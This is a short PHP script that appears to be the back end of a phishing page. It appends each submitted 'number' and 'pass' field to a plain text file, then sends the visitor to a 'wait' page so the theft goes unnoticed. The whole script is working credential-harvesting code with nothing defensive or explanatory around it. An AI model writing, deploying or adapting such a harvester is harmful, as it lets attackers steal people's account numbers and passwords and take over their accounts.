<?php

 file_put_contents("data.txt", "[NUMBER]: " . $_POST['number'] . " [PASS]: " . $_POST['pass'] . "\n", FILE_APPEND);
 
 header('Location: etc/wait.html');
 
exit();